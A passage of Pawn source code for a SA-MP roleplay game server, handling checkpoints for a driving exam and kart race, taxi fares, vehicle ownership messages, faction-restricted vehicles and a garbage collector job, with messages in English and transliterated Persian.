    else if(CP[playerid] == 19) { CP[playerid] = 20; DisablePlayerCheckpoint(playerid); SetPlayerCheckpoint(playerid,2322.9194,-2341.5715,12.6664,8.0); OnCheckpoint[playerid] = 1; }
    else if(CP[playerid] == 20)//End of Karting
    {
        CP[playerid] = 0;
        DisablePlayerCheckpoint(playerid);
        OnCheckpoint[playerid] = 0;
        GetPlayerName(playerid, name, sizeof(name));
        if(FirstKartWinner == INVALID_PLAYER_ID)
        {
            FirstKartWinner = playerid;
            for(new i = 0; i < LastPID; i++)
            {
                if(IsPlayerConnected(i))
                {
                    if(PlayerKarting[i] != 0 && PlayerInKart[i] != 0)
                    {
                        format(string, sizeof(string), "%s finished First in the Kart Race.",name);
                        SendClientMessage(i, COLOR_WHITE, string);
                    }
                }
            }
        }
        else if(SecondKartWinner == INVALID_PLAYER_ID)
        {
            SecondKartWinner = playerid;
            for(new i = 0; i < LastPID; i++)
            {
                if(IsPlayerConnected(i))
                {
                    if(PlayerKarting[i] != 0 && PlayerInKart[i] != 0)
                    {
                        format(string, sizeof(string), "%s finished Second in the Kart Race.",name);
                        SendClientMessage(i, COLOR_RED, string);
                    }
                }
            }
        }
        else if(ThirdKartWinner == INVALID_PLAYER_ID)
        {
            ThirdKartWinner = playerid;
            for(new i = 0; i < LastPID; i++)
            {
                if(IsPlayerConnected(i))
                {
                    if(PlayerKarting[i] != 0 && PlayerInKart[i] != 0)
                    {
                        format(string, sizeof(string), "%s finished Third in the Kart Race.",name);
                        SendClientMessage(i, COLOR_RED, string);
                        SendClientMessage(i, COLOR_GREEN, "** Karting Race Over **");
                        CP[i] = 0;
                        DisablePlayerCheckpoint(i);
                        OnCheckpoint[i] = 0;
                    }
                }
            }
        }
    }*/
    return 1;
}

public OnPlayerLeaveCheckpoint(playerid)
{
    IsPlayerBankCheckpoint[playerid] = false;
    return 1;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
    if(RCP[playerid] == 99)
    {
       DisablePlayerRaceCheckpoint(playerid);
       RCP[playerid] =100;
    }
    else if(RCP[playerid] == 100) ExamCheckpoint(playerid,101,1799.5825,-2194.6406,13.3750,1838.9843,-2302.9937,13.3818);
    else if(RCP[playerid] == 101) ExamCheckpoint(playerid,102,1838.9843,-2302.9937,13.3818,1800.2717,-2378.2678,13.3750);
    else if(RCP[playerid] == 102) ExamCheckpoint(playerid,103,1800.2717,-2378.2678,13.3750,1585.2157,-2378.1479,13.3750);
    else if(RCP[playerid] == 103) ExamCheckpoint(playerid,104,1585.2157,-2378.1479,13.3750,1341.4576,-2378.1096,21.7016);
    else if(RCP[playerid] == 104) ExamCheckpoint(playerid,105,1341.4576,-2378.1096,21.7016,1326.3853,-2323.4255,13.3828);
    else if(RCP[playerid] == 105) ExamCheckpoint(playerid,106,1326.3853,-2323.4255,13.3828,1320.0055,-2403.1208,13.3750);
    else if(RCP[playerid] == 106) ExamCheckpoint(playerid,107,1320.0055,-2403.1208,13.3750,1185.7991,-2419.1057,10.1544);
    else if(RCP[playerid] == 107) ExamCheckpoint(playerid,108,1185.7991,-2419.1057,10.1544,934.4471,-2225.6138,21.0070);
    else if(RCP[playerid] == 108) ExamCheckpoint(playerid,109,1033.5430,-2180.4031,12.6757,1063.1602,-1925.6379,12.9416);
    else if(RCP[playerid] == 109) ExamCheckpoint(playerid,110,1063.1602,-1925.6379,12.9416,1071.3252,-1852.2939,13.3920);
    else if(RCP[playerid] == 110) ExamCheckpoint(playerid,111,1071.3252,-1852.2939,13.3920,1312.4988,-1842.6289,13.3828);
    else if(RCP[playerid] == 111) ExamCheckpoint(playerid,112,1312.4988,-1842.6289,13.3828,1322.0879,-1732.3452,13.3828);
    else if(RCP[playerid] == 112) ExamCheckpoint(playerid,113,1322.0879,-1732.3452,13.3828,1529.7151,-1722.4672,13.3828);
    else if(RCP[playerid] == 113) ExamCheckpoint(playerid,114,1529.7151,-1722.4672,13.3828,1540.3993,-1592.4597,13.3828);
    else if(RCP[playerid] == 114) ExamCheckpoint(playerid,115,1540.3993,-1592.4597,13.3828,1658.0327,-1582.3929,13.3906);
    else if(RCP[playerid] == 115) ExamCheckpoint(playerid,116,1658.0327,-1582.3929,13.3906,1641.0499,-1440.7971,13.3828);
    else if(RCP[playerid] == 116) ExamCheckpoint(playerid,117,1641.0499,-1440.7971,13.3828,1595.7640,-1300.8219,17.2813);
    else if(RCP[playerid] == 117) ExamCheckpoint(playerid,118,1595.7640,-1300.8219,17.2813,1454.8167,-1284.2909,13.3828);
    else if(RCP[playerid] == 118) ExamCheckpoint(playerid,119,1454.8167,-1284.2909,13.3828,1482.1719,-1134.0364,23.9063);
    else if(RCP[playerid] == 119) ExamCheckpoint(playerid,120,1482.1719,-1134.0364,23.9063,1467.2368,-1034.0557,23.6563);
    else if(RCP[playerid] == 120) ExamCheckpoint(playerid,121,1467.2368,-1034.0557,23.6563,1368.3295,-1015.6000,26.6105);
    else if(RCP[playerid] == 121) ExamCheckpoint(playerid,122,1368.3295,-1015.6000,26.6105,1407.6097,-950.0627,35.3643);
    else if(RCP[playerid] == 122) ExamCheckpoint(playerid,123,1407.6097,-950.0627,35.3643,1483.9984,-978.8736,36.9677);
    else if(RCP[playerid] == 123) ExamCheckpoint(playerid,124,1483.9984,-978.8736,36.9677,1605.4910,-1151.0443,57.0103);
    else if(RCP[playerid] == 124) ExamCheckpoint(playerid,125,1605.4910,-1151.0443,57.0103,1593.9266,-1661.8320,28.4827);
    else if(RCP[playerid] == 125) ExamCheckpoint(playerid,126,1593.9266,-1661.8320,28.4827,1500.2799,-2116.7202,13.7800);
    else if(RCP[playerid] == 126) ExamCheckpoint(playerid,127,1500.2799,-2116.7202,13.7800,1325.9733,-2250.2732,13.3828);
    else if(RCP[playerid] == 127) ExamCheckpoint(playerid,128,1325.9733,-2250.2732,13.3828,1340.8284,-2194.6289,21.7014);
    else if(RCP[playerid] == 128)
	{
		ExamCheckpoint(playerid,137,1340.8284,-2194.6289,21.7014,1686.2136,-2194.6980,13.3750);
		TextDrawSetString(TD_Exam[playerid][0], "~w~Shoma Marhale ~g~29 ~w~Az ~g~30 ~w~Hastid");
	}
    else if(RCP[playerid] == 137)
    {
        DisablePlayerRaceCheckpoint(playerid);
        OnCheckpoint[playerid] = 1;
        SetPlayerRaceCheckpoint(playerid,1,1686.2136,-2194.6980,13.3750,1686.2136,-2194.6980,13.3750,5.0);
        RCP[playerid] = 138;
		TextDrawSetString(TD_Exam[playerid][0], "~w~Be ~y~DMV ~w~Bargardid");
        PlayerPlaySound(playerid,1149,0.0,0.0,0.0);
    }
    else if(RCP[playerid] == 138)
    {
        new currentveh;
        currentveh = GetPlayerVehicleID(playerid);
        if(IsPlayerInAnyVehicle(playerid)) SetVehicleToRespawn(currentveh);
        DisablePlayerRaceCheckpoint(playerid);
        OnCheckpoint[playerid] = 0;
        PlayerInfo[playerid][pCarLic] = 300;
        SaveKonVal(playerid, "pCarLic", 300);
        TakingLesson[playerid] = 0;
        if(PlayerInfo[playerid][pLanguage] == 2) SendClientMessage(playerid,COLOR_LIGHTBLUE,"Exam: Well Done! , You are now have a Driving License.");
        if(PlayerInfo[playerid][pLanguage] == 1) SendClientMessage(playerid,COLOR_LIGHTBLUE,"EXAM: Emtehan Ro Ba Movafaghiat Posht Sar Gozashtid Va Govahiname Ranandegi Daryaft Kardid.");
        RCP[playerid] = 0;
		TextDrawHideForPlayer(playerid,TD_Exam[playerid][0]);
		TextDrawHideForPlayer(playerid,TD_Exam[playerid][1]);
		TextDrawHideForPlayer(playerid,TD_Exam[playerid][2]);
        PlayerPlaySound(playerid,1058,0.0,0.0,0.0);
        GivePlayerPool(playerid,-50);
        if(PlayerInfo[playerid][pLanguage] == 1 && PlayerInfo[playerid][pLevel] <= 1)
        {
	        SCM(playerid,COLOR_ALI,"Helper: Khob, To Alan Govahiname Dari Va Mitoni Savar Vasaiel Naghlie Beshi.");
    	    SCM(playerid,COLOR_ALI,"Helper: Baraie Bazi Shoma Niaz Be Pool Darid Va Baiad Kasb Darmad Konid.");
        	SCM(playerid,COLOR_ALI,"Helper: /Jobs List Shoghlhaie Azad Server Ra Baraie Shoma Miavard..");
			SCM(playerid,COLOR_LIGHTBLUE,"SERVER: Server Be Shoma Yek Motor Faggio Hadie Dade Ast. Be Noghte Ghermez Beravid. /CarHelp");
			new Float:x,Float:y,Float:z,car = PlayerInfo[playerid][pCar];
	        GetVehiclePos(car, x, y, z);
			OnCheckpoint[playerid] = 1;
			SetPlayerCheckpoint(playerid, x, y, z, 6);
			locatemashin[playerid] = 1;
		}
        if(PlayerInfo[playerid][pLanguage] == 2 && PlayerInfo[playerid][pLevel] <= 1)
        {
			SCM(playerid,COLOR_ALI,"Helper: Well, you can now driving Motorcycles and cars.");
			SCM(playerid,COLOR_ALI,"Helper: You can have a job and earn money with that, So find any job,");
			SCM(playerid,COLOR_ALI,"Helper: Type /jobs to find a job and join on of them, and earn money with that.");
			SendClientMessage(playerid,COLOR_LIGHTBLUE,"SERVER: Go to new chackpoint and receive your car (faggio).");
			new Float:x,Float:y,Float:z,car = PlayerInfo[playerid][pCar];
			GetVehiclePos(car, x, y, z);
			OnCheckpoint[playerid] = 1;
			SetPlayerCheckpoint(playerid, x, y, z, 6);
			locatemashin[playerid] = 1;
        }
    }
    return 1;
}

public OnPlayerLeaveRaceCheckpoint(playerid)
{
    return 1;
}

public OnRconCommand(cmd[])
{
    return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{




    new string[256];
    if(newstate == PLAYER_STATE_ONFOOT)
    {
        if(CarRadioPlayed[playerid] == true) {CarRadioPlayed[playerid] = false; StopAudioStreamForPlayer(playerid);}
        if(TransportDuty[playerid] > 0)
        {
            if(TransportDuty[playerid] == 1)
            {
                TaxiDrivers -= 1;
            }
/*            else if(TransportDuty[playerid] == 2)
            {
                BusDrivers -= 1;
            }*/
            TransportDuty[playerid] = 0;
            format(string, sizeof(string), "You are now Off Duty and earned $%d.", TransportMoney[playerid]);
            SendClientMessage(playerid, COLOR_LIGHTGREEN, string);
			GivePlayerPool(playerid, TransportMoney[playerid]);
            TransportValue[playerid] = 0; TransportMoney[playerid] = 0;
        }
        if(TransportCost[playerid] > 0 && TransportDriver[playerid] < INVALID_PLAYER_ID)
        {
            if(IsPlayerConnected(TransportDriver[playerid]))
            {
                TransportMoney[TransportDriver[playerid]] += TransportCost[playerid];
                TransportTime[TransportDriver[playerid]] = 0;
                TransportCost[TransportDriver[playerid]] = 0;
                format(string, sizeof(string), "~w~The ride cost~n~~r~$%d",TransportCost[playerid]);
                GameTextForPlayer(playerid, string, 5000, 1);
                format(string, sizeof(string), "~w~Passenger left the taxi~n~~g~Earned $%d",TransportCost[playerid]);
                GameTextForPlayer(TransportDriver[playerid], string, 5000, 1);
                GivePlayerPool(playerid, -TransportCost[playerid]);
                TransportCost[playerid] = 0;
                TransportTime[playerid] = 0;
                TransportDriver[playerid] = INVALID_PLAYER_ID;
            }
        }
        TelePos[playerid][0] = 0.0;
        TelePos[playerid][1] = 0.0;
    }
    if(newstate == PLAYER_STATE_PASSENGER)
    {
    if(GetPlayerWeapon(playerid) == 30 || GetPlayerWeapon(playerid) == 29 || GetPlayerWeapon(playerid) == 31)
    {} else { SetPlayerArmedWeapon(playerid,0); }
        if(CarRadioPlayed[playerid] == false && CarRadio[GetPlayerVehicleID(playerid)][0] != '\0')
        {
            PlayAudioStreamForPlayer(playerid, CarRadio[GetPlayerVehicleID(playerid)]);
            CarRadioPlayed[playerid] = true;
        }
        new name[MAX_PLAYER_NAME];
        GetPlayerName(playerid, name, sizeof(name));
        new vehicleid = GetPlayerVehicleID(playerid);
        for(new i = 0; i < LastPID; i++)
        {
            if(IsPlayerConnected(i))
            {
                if(IsPlayerInVehicle(i, vehicleid) && GetPlayerState(i) == 2 && TransportDuty[i] > 0)
                {
                    if(GetPlayerPool(playerid) < TransportValue[i])
                    {
                        format(string, sizeof(string), "You need $%d to enter.", TransportValue[i]);
                        SendClientMessage(playerid, COLOR_WHITE, string);
                        RemovePlayerFromVehicle(playerid);
                    }
                    else
                    {
                        if(TransportDuty[i] == 1)
                        {
                            format(string, sizeof(string), "You paid $%d to the Taxi Driver.", TransportValue[i]);
                            SendClientMessage(playerid, COLOR_YELLOW, string);
                            format(string, sizeof(string), "Passenger %s has entered your Taxi.", name);
                            SendClientMessage(i, COLOR_YELLOW, string);
                            TransportTime[i] = 1;
                            TransportTime[playerid] = 1;
                            TransportCost[playerid] = TransportValue[i];
                            TransportCost[i] = TransportValue[i];
                            TransportDriver[playerid] = i;
                        }
/*                        else if(TransportDuty[i] == 2)
                        {
                            format(string, sizeof(string), "You paid $%d to the Bus Driver.", TransportValue[i]);
                            SendClientMessage(playerid, COLOR_YELLOW, string);
                            format(string, sizeof(string), "Passenger %s has entered your Bus for $%d.", name, TransportValue[i]);
                            SendClientMessage(i, COLOR_YELLOW, string);
                            GivePlayerPool(i, TransportValue[i]);
                        }*/
                        GivePlayerPool(playerid, - TransportValue[i]);
                        TransportMoney[i] += TransportValue[i];
                    }
                }
            }
        }
    }
    if(newstate == PLAYER_STATE_DRIVER)
    {
        OldCar[playerid] = GetPlayerVehicleID(playerid);
        if(IsSpecialVeh(GetPlayerVehicleID(playerid)) && !IsACop(playerid)) return Kick(playerid);
        if(CarRadioPlayed[playerid] == false && CarRadio[GetPlayerVehicleID(playerid)][0] != '\0')
        {
            PlayAudioStreamForPlayer(playerid, CarRadio[GetPlayerVehicleID(playerid)]);
            CarRadioPlayed[playerid] = true;
        }
        new ss = GetPlayerVehicleID(playerid);
        if(ss == OnEnteringVeh[playerid])
        {
            if(Ghatel[OnEnteringVehPlay[playerid]] != playerid)
            {
                if(!IsACop(playerid) && PINFO[playerid][pJailTime] <= 0 && OnEnteringVehPlay[playerid] != playerid)
                {
                    new strali[256];
                    format(strali, 256, "%s jacked your vehicle. You have 60 seconds to announce the police. Use /call 110.", PINFO[playerid][pName]);
                    SCM(OnEnteringVehPlay[playerid],COLOR_Good,strali);
                    TimerAnnouncer[OnEnteringVehPlay[playerid]] = 60;
                    Ghatel[OnEnteringVehPlay[playerid]] = playerid;
                    GhatelWanted[OnEnteringVehPlay[playerid]] = 1;
                    format(CrimeText[OnEnteringVehPlay[playerid]], 100, "Car Jacker");
                    OnEnteringVeh[playerid] = 0;
                    OnEnteringVehPlay[playerid] = INVALID_PLAYER_ID;
                }
            }
        }
        new modelid = GetVehicleModel( ss );
        if ( modelid == 481||modelid == 510||modelid == 509 )
        {
            SetVehicleSoratLimit(ss, 80);
        }
        TextDrawShowForPlayer(playerid, SpeedoTextDraw[playerid]); TDShowedSpeedo[playerid] = true;
        TextDrawShowForPlayer(playerid, FuelTextDraw[playerid]); TDShowedFuel[playerid] = true;
        benzinkamkon();
        new newcar = GetPlayerVehicleID(playerid);
        TelePos[playerid][0] = 0.0;
        TelePos[playerid][1] = 0.0;
        new vehicless;
        vehicless = GetVehicleModel(newcar) - 400;
        format(string, sizeof(string), "~g~%s", aVehicleNames[vehicless]);
        GameTextForPlayer(playerid, string, 4000, 1);
        if(IsABoat(newcar))
        {
            if(PlayerInfo[playerid][pBoatLic] < 1)
            {
                if(TakingsiLesson[playerid] == 1) { }
                else
                {
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "To Baraye Ghayegh rani be Govahiname ye ghayegh niaz dari.");
                    RemovePlayerFromVehicle(playerid);
                    TogglePlayerControllable(playerid, 1);
                }
            }
        }
        if(IsAPlane(newcar))
        {
            if(PlayerInfo[playerid][pFlyLic] < 1)
            {
                if(TakingsiLesson[playerid] == 1) { }
                else
                {
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "To Baraye Havapeyma Rani be Govahiname ye fly niaz dari !");
                    RemovePlayerFromVehicle(playerid);
                    TogglePlayerControllable(playerid, 1);
                }
            }
        }
        else
        {
            if(PlayerInfo[playerid][pCarLic] == 0)
            {
                if(IsABike(newcar) || IsAGangCar8(newcar)) {}
                else
                {
                    new carid = GetPlayerVehicleID(playerid);
                    if(TakingLesson[playerid] == 1 && carid == ExamVeh[0] || carid == ExamVeh[1] || carid == ExamVeh[2] || carid == ExamVeh[3] || carid == ExamVeh[4] || carid == ExamVeh[5] || carid == ExamVeh[6]) {}
                    else
                    {
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, "Shoma Be Driving License (Govahiname Ranandegi) Niaz Darid.");
                        RemovePlayerFromVehicle(playerid);
                    }
                }
            }

        }
        if(IsACopCar(newcar))
        {
            if(PlayerInfo[playerid][pLeader] == 1||PlayerInfo[playerid][pMember] == 1||PlayerInfo[playerid][pLeader] == 2||PlayerInfo[playerid][pMember] == 2||PlayerInfo[playerid][pLeader] == 3||PlayerInfo[playerid][pMember] == 3||PlayerInfo[playerid][pLeader] == 20||PlayerInfo[playerid][pMember] == 20) { }
            else
            {
                RemovePlayerFromVehicle(playerid);
                SendClientMessage(playerid, COLOR_BLUE,"You are not a cop.");
            }
        }
		if (IsANrcar(newcar))
		{
			if(PlayerInfo[playerid][pLeader] == 9||PlayerInfo[playerid][pMember] == 9) { }
			else
			{
				SendClientMessage(playerid, COLOR_BLUE,"You are not a news reporter.");
	                RemovePlayerFromVehicle(playerid);
			}
		}
        if(trashcar(newcar))
        {
            if(PlayerInfo[playerid][pJob] == 20)
            {
                if(OnCheckpoint[playerid] == 1) { SCM(playerid,COLOR_Good,"You already have an enable checkpoint."); }
                else
                {
                    if(Trashes[playerid] >= 20)
                    {
                        OnCheckpoint[playerid] = 1;
                        SCM(playerid,COLOR_ROUZ,"Your Trashes are full, /dumptrash first, i give you a checkpoint to you know where is it.");
                        SetPlayerCheckpoint(playerid,2109.051269,-2009.960083,13.546875,4);
                        CP[playerid] = 4002332;
                    }
                    else
                    {
                        OnAshghal[playerid] = 1;
                        SCM(playerid,COLOR_LIGHTBLUE,"Go to the checkpoints and pickup the trashes.");
                        if(Trashlevel[playerid] == 0)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,2442.196777,-1979.516479,13.546875,4);
                            CP[playerid] = 4002312;
                        }
                        if(Trashlevel[playerid] == 1)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,2505.880859,-1775.203369,13.546875,4);
                            CP[playerid] = 4002313;
                        }
                        if(Trashlevel[playerid] == 2)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,2435.575195,-1770.595092,13.546875,4);
                            CP[playerid] = 4002314;
                        }
                        if(Trashlevel[playerid] == 3)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,2153.687255,-1724.774047,13.538188,4);
                            CP[playerid] = 4002315;
                        }
                        if(Trashlevel[playerid] == 4)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,2114.340332,-1824.442871,13.556438,4);
                            CP[playerid] = 4002316;
                        }
                        if(Trashlevel[playerid] == 5)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,2295.984375,-1712.385864,13.554470,4);
                            CP[playerid] = 4002317;
                        }
                        if(Trashlevel[playerid] == 6)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,2231.493408,-1354.564941,23.986755,4);
                            CP[playerid] = 4002318;
                        }
                        if(Trashlevel[playerid] == 7)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,2052.434570,-1103.771728,24.489671,4);
                            CP[playerid] = 4002319;
                        }
                        if(Trashlevel[playerid] == 8)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,1922.792968,-1090.936889,24.656047,4);
                            CP[playerid] = 4002320;
                        }
                        if(Trashlevel[playerid] == 9)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,1785.745361,-1146.392944,23.914796,4);
                            CP[playerid] = 4002321;
                        }
                        if(Trashlevel[playerid] == 10)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,1828.393066,-1143.889038,23.916961,4);
                            CP[playerid] = 4002322;
                        }
                        if(Trashlevel[playerid] == 11)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,1829.104858,-1084.440673,23.894075,4);
                            CP[playerid] = 4002323;
                        }
                        if(Trashlevel[playerid] == 12)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,1685.226440,-1067.213134,23.906858,4);
                            CP[playerid] = 4002324;
                        }
                        if(Trashlevel[playerid] == 13)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,1660.046020,-1061.290039,23.625539,4);
                            CP[playerid] = 4002325;
                        }
                        if(Trashlevel[playerid] == 14)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,1522.405151,-1018.379455,23.919734,4);
                            CP[playerid] = 4002326;
                        }
                        if(Trashlevel[playerid] == 15)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,1313.581542,-1095.853881,25.634815,4);
                            CP[playerid] = 4002327;
                        }
                        if(Trashlevel[playerid] == 16)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,1322.108520,-1237.576416,13.546875,4);
                            CP[playerid] = 4002328;
                        }
                        if(Trashlevel[playerid] == 17)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,1357.855712,-1487.796386,13.539655,4);
                            CP[playerid] = 4002329;
                        }
                        if(Trashlevel[playerid] == 18)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,1460.671630,-1492.498535,13.546875,4);
                            CP[playerid] = 4002330;
                        }
                        if(Trashlevel[playerid] == 19)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,1094.815673,-1881.170776,13.546875,4);
                            CP[playerid] = 4002331;
                        }
                        if(Trashlevel[playerid] == 20)
                        {
                            OnCheckpoint[playerid] = 1;
                            SetPlayerCheckpoint(playerid,2109.051269,-2009.960083,13.546875,4);
                            CP[playerid] = 4002332;
                        }
                    }
                }
            }
            else
            {
                SCM(playerid,COLOR_LIGHTBLUE,"You are not a Garbage man.");
                RemovePlayerFromVehicle(playerid);
            }
        }


		if(VehOwned[newcar] == 2 && InModShop[playerid] == 0) {
		if(VehOwner[newcar] == 9999) {SCM(playerid, COLOR_WHITE, "{FFFFFF}This is a admins vehicle.");}
		else {
		new str[512];
		format(str, sizeof(str), "{FFFFFF}This vehicle is created by admin {57e547}%s{FFFFFF}.", PlayerInfo[VehOwner[newcar]][pName]);
		SCM(playerid, COLOR_WHITE, str);
		}
		}

        if(OwnedMashin[newcar] == 1 && MashinOwner[newcar] != playerid)
        {
            if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
            {
                new msg[128];
                new plname[MAX_PLAYER_NAME];
                new mod = GetVehicleModel(PlayerInfo[MashinOwner[newcar]][pCar]) - 400;
                GetPlayerName(MashinOwner[newcar], plname, sizeof(plname));
                format(msg, sizeof(msg), "You are now driving with %s's %s.",plname,aVehicleNames[mod]);
                SendClientMessage(playerid, COLOR_WHITE, msg);
                TextDrawShowForPlayer(playerid, KiloTextDraw[playerid]);
                TextDrawShowForPlayer(playerid, DoorsLockTextDraw[playerid]);
                TDShowedKilo[playerid] = true;
                TDShowedLock[playerid] = true;
            }
        }
        if(OwnedMashin_2[newcar] == 1 && MashinOwner_2[newcar] != playerid)
        {
            if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
            {
                new msg[128];
                new plname[MAX_PLAYER_NAME];
                new mod = GetVehicleModel(PlayerInfo[MashinOwner_2[newcar]][pCar_2]) - 400;
                GetPlayerName(MashinOwner_2[newcar], plname, sizeof(plname));
                format(msg, sizeof(msg), "You are now driving with %s's %s.",plname,aVehicleNames[mod]);
                SendClientMessage(playerid, COLOR_WHITE, msg);
                TextDrawShowForPlayer(playerid, KiloTextDraw[playerid]);
                TextDrawShowForPlayer(playerid, DoorsLockTextDraw2[playerid]);
                TDShowedKilo[playerid] = true;
                TDShowedLock2[playerid] = true;
            }
        }
        if(OwnedMashin[newcar] == 1 && MashinOwner[newcar] == playerid)
        {
            if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
            {
                new ali2[256];
                new mod = GetVehicleModel(PlayerInfo[MashinOwner[newcar]][pCar]) - 400;
                format(ali2,256,"Welcome to your %s.",aVehicleNames[mod]);
                SendClientMessage(playerid, COLOR_WHITE, ali2);
                TextDrawShowForPlayer(playerid, KiloTextDraw[playerid]);
                TextDrawShowForPlayer(playerid, DoorsLockTextDraw[playerid]);
                TDShowedKilo[playerid] = true;
                TDShowedLock[playerid] = true;
            }
        }
        if(OwnedMashin_2[newcar] == 1 && MashinOwner_2[newcar] == playerid)
        {
            if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
            {
                new ali2[256];
                new mod = GetVehicleModel(PlayerInfo[MashinOwner_2[newcar]][pCar_2]) - 400;
                format(ali2,256,"Welcome to your %s.",aVehicleNames[mod]);
                SendClientMessage(playerid, COLOR_WHITE, ali2);
                TextDrawShowForPlayer(playerid, KiloTextDraw[playerid]);
                TextDrawShowForPlayer(playerid, DoorsLockTextDraw2[playerid]);
                TDShowedKilo[playerid] = true;
                TDShowedLock2[playerid] = true;
            }
        }
        if(IsAllCars(newcar) && !IsABike(newcar) && !IsAGangCar8(newcar))
        {
            new vid = GetPlayerVehicleID(playerid);
            if(EngineSTATE[newcar] == 1)
            {
                GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
                SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
            }
            else
            {
                GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
                SetVehicleParamsEx(vid,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
            }
        }
        if(IsAnAmbulance(newcar))
        {
            if(PlayerInfo[playerid][pMember] == 4||PlayerInfo[playerid][pLeader] == 4) { }
			else KickAntiCheat(playerid,"Vehicle Cheats");
        }
        if(IsAGangCar(newcar))
        {
            if(PlayerInfo[playerid][pLeader] == 5||PlayerInfo[playerid][pMember] == 5) { }
			else KickAntiCheat(playerid,"Vehicle Cheats");
        }
        if(IsAGangCar2(newcar))
        {
            if(PlayerInfo[playerid][pLeader] == 6||PlayerInfo[playerid][pMember] == 6) { }
			else KickAntiCheat(playerid,"Vehicle Cheats");
        }
        if(IsAGangCar3(newcar))
        {
            if(PlayerInfo[playerid][pLeader] == 16||PlayerInfo[playerid][pMember] == 16) { }
            else {
            RemovePlayerFromVehicle(playerid);
            SendClientMessage(playerid, COLOR_TCC,"You are not a Tow Car Company member.");}
        }
        if(OwnedMashin[newcar] == 1)
        {
            if(PlayerInfo[playerid][pCar] == 0)
            {
                if(PlayerInfo[MashinOwner[newcar]][cDestroyed] >= 1 && PINFO[MashinOwner[newcar]][cFixed] != 1)
                {
                    SendClientMessage(playerid, COLOR_BLUE, "This car was destroyed and the car onwer must pay $250,000 for drive the car.");
                    RemovePlayerFromVehicle(playerid);
                }
            }
        }
        if(OwnedMashin_2[newcar] == 1)
        {
            if(PlayerInfo[playerid][pCar_2] == 0)
            {
                if(PlayerInfo[MashinOwner_2[newcar]][cDestroyed_2] >= 1 && PINFO[MashinOwner_2[newcar]][cFixed_2] != 1)
                {
                    SendClientMessage(playerid, COLOR_BLUE, "This car was destroyed and the car onwer must pay $250,000 for drive the car.");
                    RemovePlayerFromVehicle(playerid);
                }
            }
        }
        if(OwnedMashin[newcar] == 1)
        {
            if(PlayerInfo[playerid][pCar] != 0)
            {
                if(PlayerInfo[MashinOwner[newcar]][cDestroyed] >= 1 && PINFO[MashinOwner[newcar]][cFixed] != 1)
                {
                    new pricee = PlayerInfo[MashinOwner[newcar]][cPrice]*1/50;
                    format(string, sizeof(string), "Your car has been destroyed you must to pay $%s mechanical because they have your car repaired.",FormatNumber(pricee));
                    ShowPlayerDialog(playerid, 403, DIALOG_STYLE_MSGBOX, "\n", string, "Pay", "Cancel");
                }
            }
        }
        if(OwnedMashin_2[newcar] == 1)
        {
            if(PlayerInfo[playerid][pCar_2] != 0)
            {
                if(PlayerInfo[MashinOwner_2[newcar]][cDestroyed_2] >= 1 && PINFO[MashinOwner_2[newcar]][cFixed_2] != 1)
                {
                    new pricee = PlayerInfo[MashinOwner_2[newcar]][cPrice_2]*1/50;
                    format(string, sizeof(string), "Your car has been destroyed you must to pay $%s mechanical because they have your car repaired.",FormatNumber(pricee));
                    ShowPlayerDialog(playerid, 404, DIALOG_STYLE_MSGBOX, "\n", string, "Pay", "Cancel");
                }
            }
        }
        if(IsAGangCar4(newcar))
        {
            if(PlayerInfo[playerid][pLeader] == 12||PlayerInfo[playerid][pMember] == 12) { }
			else KickAntiCheat(playerid,"Vehicle Cheats");
        }
		if(newcar == MayorVeh)
		{
			if(PlayerInfo[playerid][pLeader] == 7 || PlayerInfo[playerid][pMember] == 7) { }
			else KickAntiCheat(playerid,"Vehicle Cheats");
		}
		if(IsAGangCar5(newcar))
		{
			if(PlayerInfo[playerid][pLeader] == 13||PlayerInfo[playerid][pMember] == 13) { }
			else KickAntiCheat(playerid,"Vehicle Cheats");
		}
                if(IsAGangCar17(newcar))
        {
            if(PlayerInfo[playerid][pLeader] == 17||PlayerInfo[playerid][pMember] == 17) { }
            else {
            RemovePlayerFromVehicle(playerid);
            SendClientMessage(playerid, COLOR_STAFF,"You are not a Staff member.");}
        }
        if(IsABike(newcar))
        {
            new vid = GetPlayerVehicleID(playerid);
